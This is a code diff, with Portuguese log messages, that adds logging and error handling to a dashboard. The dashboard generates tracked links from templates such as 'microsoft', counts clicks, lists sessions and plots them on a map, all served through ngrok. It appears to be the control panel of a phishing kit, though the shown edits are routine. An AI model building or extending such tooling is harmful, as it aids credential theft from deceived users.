@@ -489,42 +489,75 @@
 
         async function loadData() {
             try {
+                console.log('[DASHBOARD] Carregando dados...');
                 const [logsRes, linksRes] = await Promise.all([
                     fetch('/api/logs', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } }), 
                     fetch('/api/links', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } })
                 ]);
                 
-                if (!logsRes.ok || !linksRes.ok) throw new Error('Falha na resposta da API');
+                if (!logsRes.ok || !linksRes.ok) {
+                    console.error('[DASHBOARD] Response not OK:', logsRes.status, linksRes.status);
+                    throw new Error('Falha na resposta da API');
+                }
                 
                 logs = await logsRes.json();
-                renderLinks(await linksRes.json());
+                const linksData = await linksRes.json();
+                
+                console.log('[DASHBOARD] Links recebidos:', linksData);
+                console.log('[DASHBOARD] Logs recebidos:', logs);
+                
+                if (Array.isArray(linksData)) {
+                    renderLinks(linksData);
+                } else {
+                    console.error('[DASHBOARD] linksData não é array:', linksData);
+                    renderLinks([]);
+                }
+                
                 renderSessions(logs);
                 updateMap(logs);
                 updateStats();
             } catch (err) {
                 console.error('[DASHBOARD] Load error:', err);
+                document.getElementById('links-list').innerHTML = `<div style="opacity:0.5; text-align:center; font-size:0.65rem; color:red;">❌ ERRO: ${err.message}</div>`;
             }
         }
 
         function renderLinks(linksData) {
             const c = document.getElementById('links-list');
-            if (!linksData || linksData.length === 0) {
+            if (!c) {
+                console.error('[DASHBOARD] links-list element não encontrado');
+                return;
+            }
+            
+            if (!linksData || !Array.isArray(linksData) || linksData.length === 0) {
                 c.innerHTML = '<div style="opacity:0.5; text-align:center; font-size:0.65rem;">Nenhum link gerado ainda.</div>';
                 return;
             }
-            const fullUrl = (l) => `${window.location.origin}${l.url}`;
-            c.innerHTML = linksData.slice(0, 5).map(l => `
+            
+            try {
+                const fullUrl = (l) => `${window.location.origin}${l.url}`;
+                c.innerHTML = linksData.slice(0, 5).map(l => {
+                    const template = (l.template || 'microsoft').toUpperCase();
+                    const url = fullUrl(l);
+                    const clicks = l.clicks || 0;
+                    return `
                 <div style="background:rgba(255,255,255,0.08); border:1px solid rgba(0,210,255,0.2); padding:12px; border-radius:8px; margin-bottom:12px; display:flex; flex-direction:column; gap:8px;">
                     <div style="display:flex; justify-content:space-between; align-items:flex-start; gap:10px;">
-                        <div>
-                            <div style="font-size:0.65rem; color:var(--primary); font-weight:bold;">${(l.template || 'microsoft').toUpperCase()}</div>
-                            <div style="font-size:0.6rem; color:#aaa; margin-top:3px; word-break:break-all;">${fullUrl(l)}</div>
+                        <div style="flex:1; min-width:0;">
+                            <div style="font-size:0.65rem; color:var(--primary); font-weight:bold;">${template}</div>
+                            <div style="font-size:0.6rem; color:#aaa; margin-top:3px; word-break:break-all; font-family:monospace;">${url}</div>
                         </div>
-                        <button onclick="copy('${fullUrl(l).replace(/'/g, "\\'")}')" style="background:var(--primary); border:none; padding:6px 10px; border-radius:5px; font-size:0.55rem; font-weight:bold; cursor:pointer; white-space:nowrap; flex-shrink:0;">COPY</button>
+                        <button onclick="copy('${url.replace(/'/g, "\\'")}')" style="background:var(--primary); border:none; padding:6px 10px; border-radius:5px; font-size:0.55rem; font-weight:bold; cursor:pointer; white-space:nowrap; flex-shrink:0;">COPY</button>
                     </div>
-                    <div style="font-size:0.55rem; color:#666;">📊 ${l.clicks || 0} cliques</div>
+                    <div style="font-size:0.55rem; color:#666;">📊 ${clicks} cliques</div>
                 </div>
-            `).join('');
+                    `;
+                }).join('');
+                console.log('[DASHBOARD] Links renderizados com sucesso');
+            } catch (e) {
+                console.error('[DASHBOARD] Erro ao renderizar links:', e);
+                c.innerHTML = `<div style="opacity:0.5; text-align:center; font-size:0.65rem; color:red;">❌ ERRO ao renderizar: ${e.message}</div>`;
+            }
         }
 
         function toggleSession(id) {
@@ -925,20 +958,29 @@
             btn.textContent = '⏳ GERANDO...';
             btn.disabled = true;
             try {
+                console.log('[DASHBOARD] Criando novo link...');
                 const res = await fetch('/api/links', { 
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' }, 
                     body: JSON.stringify({ template: document.getElementById('template-select').value }) 
                 });
+                console.log('[DASHBOARD] Resposta POST /api/links:', res.status);
+                
                 if (res.ok) {
-                    await loadData();
-                    btn.textContent = '✅ LINK CRIADO!';
-                    setTimeout(() => {
-                        btn.textContent = originalText;
-                        btn.disabled = false;
-                    }, 2000);
+                    const newLink = await res.json();
+                    console.log('[DASHBOARD] Novo link criado:', newLink);
+                    
+                    // Recarregar dados após pequeno delay para garantir sincronização
+                    setTimeout(async () => {
+                        await loadData();
+                        btn.textContent = '✅ LINK CRIADO!';
+                        setTimeout(() => {
+                            btn.textContent = originalText;
+                            btn.disabled = false;
+                        }, 2000);
+                    }, 500);
                 } else {
-                    throw new Error('API error');
+                    throw new Error(`API error: ${res.status}`);
                 }
             } catch (err) {
                 console.error('Error creating link:', err);
